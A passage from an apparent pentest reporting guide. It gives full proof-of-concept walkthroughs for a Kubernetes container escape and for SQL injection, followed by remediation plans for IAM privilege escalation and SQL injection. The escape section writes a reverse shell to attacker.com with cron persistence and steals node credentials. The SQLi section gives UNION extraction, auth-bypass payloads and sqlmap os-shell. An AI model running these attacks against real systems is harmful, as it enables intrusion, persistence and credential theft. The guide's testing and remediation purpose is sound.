metadata:
  name: escape-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: escape-container
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
YAML

# Deploy pod
kubectl apply -f privileged-pod.yaml

# Wait for pod to be ready
kubectl wait --for=condition=ready pod/escape-pod --timeout=60s
````

**Expected Output:**

```
pod/escape-pod created
pod/escape-pod condition met
```

### Step 2: Escape to Host Filesystem

```bash
# Access pod shell
kubectl exec -it escape-pod -- /bin/bash

# From inside pod - verify host access
ls /host
cat /host/etc/hostname
cat /host/etc/shadow
```

**Evidence:**

```bash
# Full host filesystem accessible
root@escape-pod:/# ls /host
bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

# Can read sensitive host files
root@escape-pod:/# head -n 3 /host/etc/shadow
root:$6$encrypted$hash:18000:0:99999:7:::
daemon:*:18000:0:99999:7:::
```

### Step 3: Achieve Host Code Execution

```bash
# From inside pod
# Create reverse shell on host
cat > /host/tmp/backdoor.sh <<'SCRIPT'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
SCRIPT

chmod +x /host/tmp/backdoor.sh

# Add cron job for persistence
echo "* * * * * root /tmp/backdoor.sh" >> /host/etc/crontab

# Alternatively, use nsenter to break into host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Verify we're on host (not container)
hostname
cat /etc/machine-id
```

**Evidence:**

```bash
root@k8s-node-01:/# hostname
k8s-node-01  # Host hostname, not container

root@k8s-node-01:/# ps aux | grep kubelet
root      1234  ... /usr/bin/kubelet --config=/var/lib/kubelet/config.yaml
```

### Step 4: Steal Node Credentials

```bash
# Access kubelet credentials
cat /host/var/lib/kubelet/kubeconfig

# Access etcd certificates if colocated
ls -la /host/etc/kubernetes/pki/

# Read service account tokens for all pods
find /host/var/lib/kubelet/pods -name token -exec cat {} \; 2>/dev/null
```

### Step 5: Lateral Movement to Control Plane

```bash
# Use stolen kubelet credentials
export KUBECONFIG=/host/var/lib/kubelet/kubeconfig

# List all pods in cluster
kubectl get pods --all-namespaces

# Access secrets
kubectl get secrets --all-namespaces

# Create admin service account
kubectl create sa cluster-admin -n kube-system
kubectl create clusterrolebinding admin-bind --clusterrole=cluster-admin --serviceaccount=kube-system:cluster-admin
```

## Impact Demonstration

- Escaped container to host root access
- Read sensitive host files (/etc/shadow)
- Achieved persistent host code execution
- Stole kubelet and service account credentials
- Potential full cluster compromise via control plane access

## Cleanup

```bash
# Remove cron backdoor
kubectl exec escape-pod -- sed -i '/backdoor.sh/d' /host/etc/crontab
kubectl exec escape-pod -- rm /host/tmp/backdoor.sh

# Delete pod
kubectl delete pod escape-pod

# Remove any created service accounts
kubectl delete sa cluster-admin -n kube-system 2>/dev/null
kubectl delete clusterrolebinding admin-bind 2>/dev/null

rm privileged-pod.yaml
```

## References

- CWE-250: Execution with Unnecessary Privileges
- Kubernetes Security Best Practices
- Container Escape Techniques (Trail of Bits) EOF

````

**Example 3: SQL Injection PoC**

```bash
cat > poc_sqli.md <<'EOF'
# Proof of Concept: SQL Injection in User Search Endpoint

## Executive Summary
Unauthenticated SQL injection in /api/search parameter allows complete database extraction and authentication bypass.

## Environment
- **Target**: https://vulnerable-app.example.com
- **Endpoint**: /api/search?username=
- **Database**: MySQL 5.7.x
- **Prerequisites**: None (unauthenticated)

## Vulnerability Details
The username parameter is directly concatenated into SQL query without sanitization or parameterization.

## Proof of Concept

### Step 1: Identify Injection Point
```bash
# Test for SQL injection
curl -s "https://vulnerable-app.example.com/api/search?username=test'" | jq

# Boolean-based detection
curl -s "https://vulnerable-app.example.com/api/search?username=test' AND '1'='1" | jq
curl -s "https://vulnerable-app.example.com/api/search?username=test' AND '1'='2" | jq
````

**Expected Output:**

```
First request returns results, second returns nothing, confirming SQL injection
```

### Step 2: Enumerate Database Structure

```bash
# Get database version
curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,@@version,3,4-- -" | jq

# Get current database
curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,database(),3,4-- -" | jq

# List all tables
curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -" | jq
```

**Evidence:**

```json
{
  "results": [{
    "id": 1,
    "username": "5.7.33-0ubuntu0.18.04.1",
    "email": null
  }]
}

{
  "results": [{
    "username": "users,admin_users,sessions,api_keys"
  }]
}
```

### Step 3: Extract Sensitive Data

```bash
# Get column names from users table
curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -" | jq

# Extract user credentials
curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(username,':',password_hash),3,4 FROM users-- -" | jq

# Extract admin credentials
curl -s "https://vulnerable-app.example.com/api/search?username=test' UNION SELECT 1,group_concat(username,':',password_hash),3,4 FROM admin_users-- -" | jq
```

**Evidence:**

```json
{
  "results": [{
    "username": "admin:$2b$10$abcd1234...,user1:$2b$10$efgh5678...,user2:$2b$10$ijkl9012..." }]
}

````

### Step 4: Demonstrate Authentication Bypass
```bash
# Bypass login with SQL injection
curl -X POST "https://vulnerable-app.example.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1", "password":"anything"}'

# Alternative: Use UNION to inject valid session
curl -X POST "https://vulnerable-app.example.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test'\'' UNION SELECT 1,'\''admin'\'','\''known_hash'\'',4-- -", "password":"known_password"}'
````

**Evidence:**

```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": "admin",
  "role": "administrator"
}
```

### Step 5: Automated Exploitation with SQLMap

```bash
# Save request to file
cat > request.txt <<'REQUEST'
GET /api/search?username=test HTTP/1.1
Host: vulnerable-app.example.com
User-Agent: Mozilla/5.0
Accept: application/json
REQUEST

# Run SQLMap
sqlmap -r request.txt --batch --level=5 --risk=3

# Dump specific table
sqlmap -r request.txt --batch -D database_name -T admin_users --dump

# Get shell (if possible)
sqlmap -r request.txt --batch --os-shell
```

**Evidence:**

```
[*] starting @ 10:15:33
[10:15:34] [INFO] testing connection to the target URL
[10:15:34] [INFO] testing if the target URL content is stable
[10:15:35] [INFO] target URL content is stable
[10:15:35] [INFO] testing if GET parameter 'username' is dynamic
[10:15:35] [INFO] GET parameter 'username' appears to be dynamic
[10:15:36] [INFO] heuristic (basic) test shows that GET parameter 'username' might be injectable

Database: app_database
Table: admin_users
[3 entries]
+----+----------+----------------------------------+---------------+
| id | username | password_hash                    | email         |
+----+----------+----------------------------------+---------------+
| 1  | admin    | $2b$10$N9qo8uLO... | admin@ex.com  |
| 2  | root     | $2b$10$Z8fK3mN... | root@ex.com   |
| 3  | superadmin| $2b$10$A7bC9dE... | super@ex.com |
+----+----------+----------------------------------+---------------+
```

## Impact Demonstration

- Complete database enumeration achieved
- Extracted all user credentials including admin accounts
- Authentication bypass demonstrated
- Potential for complete application compromise
- [Inference] Depending on database permissions, could achieve OS command execution

## Cleanup

No cleanup required - read-only exploitation (no data modified)

## References

- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
- SQLMap Documentation: https://github.com/sqlmapproject/sqlmap EOF

````

### PoC Recording and Evidence Collection

**Screenshot and Command Output Capture:**

```bash
# Use script command to record entire terminal session
script -a poc_session.log

# Execute PoC commands
# ... exploitation steps ...

# Exit recording
exit

# Alternatively, use asciinema for replay capability
asciinema rec poc_demo.cast

# Upload recording
asciinema upload poc_demo.cast
````

**Automated Evidence Collection Script:**

```bash
#!/bin/bash
# evidence_collector.sh

EVIDENCE_DIR="poc_evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

echo "[*] Collecting evidence for PoC..."

# Capture system information
uname -a > "$EVIDENCE_DIR/system_info.txt"
date > "$EVIDENCE_DIR/timestamp.txt"

# Capture network configuration
ip addr show > "$EVIDENCE_DIR/network_config.txt" 2>&1
ifconfig > "$EVIDENCE_DIR/ifconfig.txt" 2>&1

# Capture current user context
whoami > "$EVIDENCE_DIR/current_user.txt"
id >> "$EVIDENCE_DIR/current_user.txt"

# AWS context if applicable
if command -v aws &> /dev/null; then
    aws sts get-caller-identity > "$EVIDENCE_DIR/aws_identity.txt" 2>&1
    aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2) > "$EVIDENCE_DIR/aws_permissions.txt" 2>&1
fi

# Kubernetes context if applicable
if command -v kubectl &> /dev/null; then
    kubectl config current-context > "$EVIDENCE_DIR/k8s_context.txt" 2>&1
    kubectl auth can-i --list > "$EVIDENCE_DIR/k8s_permissions.txt" 2>&1
fi

# Azure context if applicable
if command -v az &> /dev/null; then
    az account show > "$EVIDENCE_DIR/azure_account.txt" 2>&1
fi

# GCP context if applicable
if command -v gcloud &> /dev/null; then
    gcloud config list > "$EVIDENCE_DIR/gcp_config.txt" 2>&1
    gcloud projects get-iam-policy $(gcloud config get-value project) > "$EVIDENCE_DIR/gcp_iam.txt" 2>&1
fi

echo "[+] Evidence collected in: $EVIDENCE_DIR"

# Create archive
tar -czf "${EVIDENCE_DIR}.tar.gz" "$EVIDENCE_DIR"
echo "[+] Archive created: ${EVIDENCE_DIR}.tar.gz"
```

**Screenshot Automation:**

```bash
# Install required tools
sudo apt-get install -y scrot imagemagick

# Take screenshot with timestamp
scrot -d 1 "evidence_%Y%m%d_%H%M%S.png"

# Take screenshot of specific window
scrot -u -d 1 "window_%Y%m%d_%H%M%S.png"

# Annotate screenshot
convert evidence.png -pointsize 20 -fill red -annotate +10+30 "Privilege Escalation Success" evidence_annotated.png
```

### PoC Safety Guidelines

**Do Not:**

- Cause denial of service or resource exhaustion
- Modify production data (except in isolated test environments)
- Exfiltrate sensitive data beyond proof of access
- Enable backdoors without clear documentation and cleanup
- Execute PoC on systems without authorization

**Do:**

- Test in isolated/staging environments when possible
- Document all changes made during exploitation
- Provide complete cleanup procedures
- Use read-only operations when demonstrating data access
- Include timestamps and session IDs for traceability

## Remediation Recommendations

Remediation recommendations provide specific, actionable guidance to fix identified vulnerabilities and prevent recurrence.

### Remediation Framework

**Comprehensive Remediation Structure:**

```bash
cat > remediation_template.md <<EOF
# Remediation Recommendations: [Vulnerability Name]

## Immediate Actions (Critical Path)
1. [Most urgent action]
2. [Second priority action]
3. [Emergency containment if needed]

## Short-Term Remediation (< 30 days)
### Fix Implementation
[Specific code/configuration changes]

### Verification Steps
[How to confirm fix is effective]

## Long-Term Remediation (30-90 days)
### Architectural Changes
[Design improvements]

### Process Improvements
[Development/deployment changes]

## Prevention Measures
### Code Review Guidelines
[Specific patterns to avoid]

### Automated Detection
[Security tools/tests to implement]

### Training & Awareness
[Team education needs]

## Verification & Testing
### Regression Tests
[Tests to ensure fix doesn't break functionality]

### Security Tests
[Tests to verify vulnerability is fixed]

## Rollback Plan
[If remediation causes issues]

## References
[Links to documentation, best practices]
EOF
```

### Remediation Examples by Vulnerability Type

**Example 1: AWS IAM Privilege Escalation Remediation**

````bash
cat > remediation_aws_privesc.md <<'EOF'
# Remediation Recommendations: AWS IAM Privilege Escalation via iam:PassRole

## Immediate Actions (Critical Path)

1. **Revoke iam:PassRole Permission** (Priority: P0 - Immediate)
```bash
# Remove dangerous permission from developer-user
aws iam detach-user-policy \
  --user-name developer-user \
  --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy

# Create restricted policy
cat > restricted_policy.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "lambda:CreateFunction",
        "lambda:UpdateFunctionCode",
        "lambda:InvokeFunction"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "iam:PassedToService": "lambda.amazonaws.com"
        },
        "ArnEquals": {
          "iam:PassRole": "arn:aws:iam::123456789012:role/LambdaExecutionRole-Restricted"
        }
      }
    }
  ]
}
JSON

# Apply restricted policy
aws iam create-policy \
  --policy-name DeveloperPolicy-Restricted \
  --policy-document file://restricted_policy.json

aws iam attach-user-policy \
  --user-name developer-user \
  --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy-Restricted
````

2. **Audit HighPrivilegeRole Trust Policy** (Priority: P0 - Immediate)

```bash
# Review and restrict trust policy
cat > restricted_trust_policy.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "StringEquals": {
          "aws:SourceAccount": "123456789012"
        },
        "ArnLike": {
          "aws:SourceArn": "arn:aws:lambda:us-east-1:123456789012:function/approved-function-*"
        }
      }
    }
  ]
}
JSON

# Update role trust policy
aws iam update-assume-role-policy \
  --role-name HighPrivilegeRole \
  --policy-document file://restricted_trust_policy.json
```

3. **Enable CloudTrail Monitoring** (Priority: P0 - Immediate)

```bash
# Create EventBridge rule for PassRole actions
aws events put-rule \
  --name detect-passrole-abuse \
  --event-pattern '{
    "source": ["aws.iam"],
    "detail-type": ["AWS API Call via CloudTrail"],
    "detail": {
      "eventName": ["PassRole"],
      "requestParameters": {
        "roleName": ["HighPrivilegeRole"]
      }
    }
  }'

# Configure SNS alert
aws events put-targets \
  --rule detect-passrole-abuse \
  --targets "Id"="1","Arn"="arn:aws:sns:us-east-1:123456789012:security-alerts"
```

## Short-Term Remediation (< 30 days)

### Fix Implementation

**1. Implement Permission Boundaries**

```bash
# Create permission boundary
cat > permission_boundary.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "lambda:*",
        "logs:*",
        "s3:GetObject",
        "s3:PutObject"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Deny",
      "Action": [
        "iam:*",
        "organizations:*",
        "account:*"
      ],
      "Resource": "*"
    }
  ]
}
JSON

aws iam create-policy \
  --policy-name DeveloperBoundary \
  --policy-document file://permission_boundary.json

# Apply boundary to existing users
aws iam put-user-permissions-boundary \
  --user-name developer-user \
  --permissions-boundary arn:aws:iam::123456789012:policy/DeveloperBoundary
```

**2. Implement Resource-Based Policies on Roles**

```bash
# Add resource-based restrictions to high-privilege roles
cat > role_policy_update.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowAdminAccess",
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": ["10.0.0.0/8", "172.16.0.0/12"]
        }
      }
    }
  ]
}
JSON

aws iam put-role-policy \
  --role-name HighPrivilegeRole \
  --policy-name IpRestriction \
  --policy-document file://role_policy_update.json
```

**3. Enable AWS IAM Access Analyzer**

```bash
# Create analyzer for organization
aws accessanalyzer create-analyzer \
  --analyzer-name org-iam-analyzer \
  --type ORGANIZATION

# Review findings
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:access-analyzer:us-east-1:123456789012:analyzer/org-iam-analyzer
```

### Verification Steps

```bash
# Test that privilege escalation is blocked
aws lambda create-function \
  --function-name test-privesc \
  --role arn:aws:iam::123456789012:role/HighPrivilegeRole \
  --runtime python3.9 \
  --handler index.handler \
  --zip-file fileb://test.zip
# Expected: AccessDenied error

# Verify permission boundary is effective
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:user/developer-user \
  --action-names iam:CreateUser \
  --permissions-boundary arn:aws:iam::123456789012:policy/DeveloperBoundary
# Expected: implicitDeny due to boundary
```

## Long-Term Remediation (30-90 days)

### Architectural Changes

**1. Implement Least Privilege by Default**

```bash
# Create role-based access structure
# Separate roles: Developer, QA, Operations, Admin

# Developer role with minimal Lambda permissions
cat > developer_role.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "lambda:CreateFunction",
        "lambda:UpdateFunctionCode",
        "lambda:InvokeFunction",
        "lambda:GetFunction",
        "lambda:ListFunctions"
      ],
      "Resource": "arn:aws:lambda:*:123456789012:function:dev-*"
    },
    {
      "Effect": "Allow",
      "Action": "iam:PassRole",
      "Resource": "arn:aws:iam::123456789012:role/LambdaExecutionRole-Dev",
      "Condition": {
        "StringEquals": {
          "iam:PassedToService": "lambda.amazonaws.com"
        }
      }
    }
  ]
}
JSON
```

**2. Implement Service Control Policies (SCPs)**

[Unverified] SCPs require AWS Organizations and may not be available in all account configurations.

```bash
# Create SCP to prevent privilege escalation organization-wide
cat > prevent_privesc_scp.json <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Action": [
        "iam:CreateAccessKey",
        "iam:CreateUser",
        "iam:PutUserPolicy",
        "iam:AttachUserPolicy"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalArn": "arn:aws:iam::123456789012:role/AdminRole"
        }
      }
    }
  ]
}
JSON

aws organizations create-policy \
  --name PreventPrivilegeEscalation \
  --type SERVICE_CONTROL_POLICY \
  --content file://prevent_privesc_scp.json
```

**3. Implement Just-In-Time (JIT) Access**

[Inference] JIT access patterns require custom implementation or third-party solutions in AWS.

```python
# Lambda function for JIT role assumption
import boto3
import json
from datetime import datetime, timedelta

def lambda_handler(event, context):
    sts = boto3.client('sts')
    
    # Validate request
    user = event['requestContext']['authorizer']['claims']['email']
    role_arn = event['body']['role_arn']
    justification = event['body']['justification']
    
    # Check approval (integrate with ticketing system)
    if not is_approved(user, role_arn, justification):
        return {'statusCode': 403, 'body': 'Not approved'}
    
    # Generate short-lived credentials (1 hour)
    response = sts.assume_role(
        RoleArn=role_arn,
        RoleSessionName=f'jit-{user}-{datetime.now().strftime("%Y%m%d%H%M%S")}',
        DurationSeconds=3600,
        Tags=[
            {'Key': 'User', 'Value': user},
            {'Key': 'Justification', 'Value': justification}
        ]
    )
    
    # Log access
    log_access(user, role_arn, justification)
    
    return {
        'statusCode': 200,
        'body': json.dumps({
            'credentials': response['Credentials'],
            'expiration': response['Credentials']['Expiration'].isoformat()
        })
    }
```

### Process Improvements

**1. Implement IAM Policy Review Process**

```bash
# Create policy validation script
cat > validate_policy.sh <<'BASH'
#!/bin/bash
POLICY_FILE=$1

# Check for wildcard resources
if grep -q '"Resource": "\*"' "$POLICY_FILE"; then
    echo "[WARNING] Wildcard resource detected"
fi

# Check for wildcard actions
if grep -q '"Action": "\*"' "$POLICY_FILE"; then
    echo "[ERROR] Wildcard action detected"
    exit 1
fi

# Check for iam:PassRole without conditions
if grep -q 'iam:PassRole' "$POLICY_FILE" && ! grep -q '"Condition"' "$POLICY_FILE"; then
    echo "[ERROR] iam:PassRole without conditions"
    exit 1
fi

# Validate JSON syntax
if ! jq empty "$POLICY_FILE" 2>/dev/null; then
    echo "[ERROR] Invalid JSON"
    exit 1
fi

# Use IAM Policy Simulator
aws iam simulate-custom-policy \
    --policy-input-list file://"$POLICY_FILE" \
    --action-names iam:CreateUser iam:PutUserPolicy \
    --output table

echo "[OK] Policy validation passed"
BASH

chmod +x validate_policy.sh
```

**2. Integrate with CI/CD Pipeline**

```yaml
# .github/workflows/iam-validation.yml
name: IAM Policy Validation

on:
  pull_request:
    paths:
      - 'iam-policies/**/*.json'

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup AWS CLI
        uses: aws-actions/configure-aws-credentials@v1
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1
      
      - name: Validate IAM Policies
        run: |
          for policy in iam-policies/**/*.json; do
            echo "Validating $policy"
            ./validate_policy.sh "$policy"
          done
      
      - name: Run IAM Access Analyzer
        run: |
          aws accessanalyzer validate-policy \
            --policy-document file://iam-policies/new-policy.json \
            --policy-type IDENTITY_POLICY
```

## Prevention Measures

### Code Review Guidelines

**IAM Policy Checklist:**

- [ ] No wildcard (*) in Action unless absolutely necessary
- [ ] Specific resources defined (no wildcard in Resource)
- [ ] iam:PassRole has conditions restricting passed roles
- [ ] High-privilege actions have IP/MFA conditions
- [ ] Permission boundaries applied to users/roles
- [ ] Trust policies specify exact principals
- [ ] No hard-coded credentials in code/configs

### Automated Detection

**1. AWS Config Rules**

```bash
# Deploy AWS Config rule for iam:PassRole detection
aws configservice put-config-rule --config-rule '{
  "ConfigRuleName": "detect-unrestricted-passrole",
  "Description": "Detects IAM policies with unrestricted iam:PassRole",
  "Scope": {
    "ComplianceResourceTypes": ["AWS::IAM::Policy", "AWS::IAM::Role"]
  },
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "IAM_POLICY_NO_STATEMENTS_WITH_ADMIN_ACCESS"
  }
}'
```

**2. Custom CloudWatch Insights Query**

```bash
# Query for privilege escalation patterns
cat > cloudwatch_query.txt <<'QUERY'
fields @timestamp, userIdentity.principalId, eventName, requestParameters.roleName
| filter eventName = "PassRole" or eventName = "CreateFunction" or eventName = "UpdateFunctionCode"
| sort @timestamp desc
| limit 100
QUERY

aws logs start-query \
  --log-group-name /aws/cloudtrail/events \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --query-string file://cloudwatch_query.txt
```

**3. Prowler Security Checks**

```bash
# Run Prowler checks for IAM issues
prowler aws --services iam --checks iam_no_root_access_key,iam_user_mfa_enabled,iam_policy_no_full_access

# Continuous monitoring
prowler aws --services iam --output-formats json,html --output-directory ./prowler-reports
```

### Training & Awareness

**Security Training Topics:**

1. **IAM Best Practices Workshop** (2 hours)
    
    - Least privilege principle
    - Permission boundaries
    - Trust policy security
    - Real-world escalation scenarios
2. **Secure Development Guidelines** (ongoing)
    
    - How to request AWS permissions
    - Pre-deployment security checklist
    - Incident response procedures
3. **Monthly Security Reviews**
    
    - Review of recent IAM changes
    - Discussion of security findings
    - Threat intelligence updates

## Verification & Testing

### Regression Tests

```bash
# Test legitimate Lambda deployment still works
./test_lambda_deploy.sh

# Test application functionality
./run_integration_tests.sh

# Verify no production impact
aws cloudwatch get-metric-statistics \
  --namespace AWS/Lambda \
  --metric-name Errors \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%S) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%S) \
  --period 3600 \
  --statistics Sum
```

### Security Tests

```bash
# Attempt privilege escalation (should fail)
cat > security_test.sh <<'BASH'
#!/bin/bash
set -e

echo "[*] Testing privilege escalation prevention..."

# Test 1: PassRole to high-privilege role
echo "[*] Test 1: Attempting PassRole..."
if aws lambda create-function \
  --function-name security-test \
  --role arn:aws:iam::123456789012:role/HighPrivilegeRole \
  --runtime python3.9 \
  --handler index.handler \
  --zip-file fileb://test.zip 2>&1 | grep -q "AccessDenied"; then
    echo "[PASS] PassRole correctly denied"
else
    echo "[FAIL] PassRole not blocked!"
    exit 1
fi

# Test 2: Direct IAM user creation
echo "[*] Test 2: Attempting IAM user creation..."
if aws iam create-user --user-name test-user 2>&1 | grep -q "AccessDenied"; then
    echo "[PASS] IAM user creation correctly denied"
else
    echo "[FAIL] IAM user creation not blocked!"
    exit 1
fi

# Test 3: Permission boundary bypass attempt
echo "[*] Test 3: Attempting permission boundary removal..."
if aws iam delete-user-permissions-boundary --user-name developer-user 2>&1 | grep -q "AccessDenied"; then
    echo "[PASS] Boundary removal correctly denied"
else
    echo "[FAIL] Boundary removal not blocked!"
    exit 1
fi

echo "[+] All security tests passed"
BASH

chmod +x security_test.sh
./security_test.sh
```

## Rollback Plan

If remediation causes production issues:

```bash
# 1. Restore original policy (keep backup)
aws iam put-user-policy \
  --user-name developer-user \
  --policy-name DeveloperPolicy \
  --policy-document file://backup/original_policy.json

# 2. Remove permission boundary temporarily
aws iam delete-user-permissions-boundary \
  --user-name developer-user

# 3. Restore trust policy
aws iam update-assume-role-policy \
  --role-name HighPrivilegeRole \
  --policy-document file://backup/original_trust_policy.json

# 4. Document rollback
echo "Rolled back at $(date)" >> rollback_log.txt
echo "Reason: <production issue description>" >> rollback_log.txt
```

## References

- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- AWS Security Best Practices: https://aws.amazon.com/architecture/security-identity-compliance/
- CIS AWS Foundations Benchmark
- Rhino Security Labs AWS IAM Privilege Escalation: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/ EOF

````

**Example 2: SQL Injection Remediation**

```bash
cat > remediation_sqli.md <<'EOF'
# Remediation Recommendations: SQL Injection in User Search

## Immediate Actions (Critical Path)

1. **Deploy WAF Rule** (Priority: P0 - Immediate)
```bash
# AWS WAF SQL injection rule
aws wafv2 create-web-acl \
  --name block-sqli \
  --scope REGIONAL \
  --default-action Allow={} \
  --rules '[
    {
      "Name": "BlockSQLi",
      "Priority": 1,
      "Statement": {
        "SqliMatchStatement": {
          "FieldToMatch": {
            "AllQueryArguments": {}
          },
          "TextTransformations": [
            {
              "Priority": 0,
              "Type": "URL_DECODE"
            },
            {
              "Priority": 1,
              "Type": "HTML_ENTITY_DECODE"
            }
          ]
        }
      },
      "Action": {"Block": {}},
      "VisibilityConfig": {
        "SampledRequestsEnabled": true,
        "CloudWatchMetricsEnabled": true,
        "MetricName": "BlockSQLi"
      }
    }
  ]' \
  --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=block-sqli

# Associate with API Gateway
aws wafv2 associate-web-acl \
  --web-acl-arn <web-acl-arn> \
  --resource-arn <api-gateway-arn>
````

2. **Implement Input Validation** (Priority: P0 - Within 24h)

```python
# Temporary input sanitization (NOT a complete fix)
import re

def validate_username(username):
    """Strict alphanumeric validation"""
    if not re.match(r'^[a-zA-Z0-9_-]{1,50}$', username):
        raise ValueError("Invalid username format")
    return username

@app.route('/api/search')
def search():
    try:
        username = request.args.get('username', '')
        username = validate_username(username)
        # ... query logic ...
    except ValueError as e:
        return jsonify({'error': str(e)}), 400
```

3. **Enable Query Logging** (Priority: P0 - Immediate)

```python
# Enable MySQL general log temporarily (performance impact)
import logging

# Configure Python logging
logging.basicConfig(level=logging.INFO)
db_logger = logging.getLogger('sqlalchemy.engine')
db_logger.setLevel(logging.INFO)

# MySQL configuration
# SET GLOBAL general_log = 'ON';
# SET GLOBAL log_output = 'FILE';
```

## Short-Term Remediation (< 7 days)

### Fix Implementation

**PRIMARY FIX: Use Parameterized Queries**

```python
# BEFORE (Vulnerable):
def search_user_vulnerable(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchall()

# AFTER (Fixed):
def search_user_secure(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    return cursor.fetchall()
```

**Complete Secure Implementation:**

```python
# secure_search.py
from flask import Flask, request, jsonify
import mysql.connector
from mysql.connector import Error
import re
from functools import wraps

app = Flask(__name__)

# Database configuration (replace with secure secrets management in production)
DB_CONFIG = {
    "host": "localhost",
    "database": "app_db",
    "user": "app_user",
    "password": "<strong_password>",
    "autocommit": False,
}

def get_db_connection():
    """Create secure database connection."""
    try:
        conn = mysql.connector.connect(**DB_CONFIG)
        return conn
    except Error as e:
        app.logger.error(f"Database connection error: {e}")
        raise

def validate_input(param_name: str, pattern: str, max_length: int):
    """Decorator for input validation."""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            value = request.args.get(param_name, "")

            # Length check
            if len(value) > max_length:
                return jsonify({"error": "Input too long"}), 400

            # Pattern validation
            if not re.match(pattern, value):
                return jsonify({"error": "Invalid input format"}), 400

            return f(*args, **kwargs)
        return wrapper
    return decorator

@app.route("/api/search")
@validate_input("username", r"^[a-zA-Z0-9_-]{1,50}$", 50)
def search_user():
    """Secure user search endpoint."""
    username = request.args.get("username", "")

    conn = None
    cursor = None

    try:
        conn = get_db_connection()
        cursor = conn.cursor(dictionary=True)

        # Parameterized query (PRIMARY DEFENSE)
        query = """
            SELECT id, username, email, created_at
            FROM users
            WHERE username = %s
        """

        cursor.execute(query, (username,))
        results = cursor.fetchall()

        # Sanitize output (defense in depth)
        for result in results:
            result.pop("password_hash", None)
            result.pop("reset_token", None)

        app.logger.info(f"User search: username={username}, results={len(results)}")

        return jsonify({
            "success": True,
            "results": results,
            "count": len(results),
        })

    except Error as e:
        app.logger.error(f"Database error: {e}")
        # Generic error message (don't leak DB info)
        return jsonify({"error": "Search failed"}), 500

    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()

# Additional security headers
@app.after_request
def add_security_headers(response):
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    return response

if __name__ == "__main__":
    # For local testing only. Use a proper cert in production and a WSGI server (gunicorn/uWSGI).
    app.run(host="0.0.0.0", port=5000, ssl_context="adhoc")
````

**ORM-Based Implementation (Additional Layer):**

```python
# Using SQLAlchemy ORM (prevents SQL injection by design)
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import and_, or_

db = SQLAlchemy(app)

class User(db.Model):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    email = db.Column(db.String(100), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

@app.route('/api/search')
@validate_input('username', r'^[a-zA-Z0-9_-]{1,50}$', 50)
def search_user_orm():
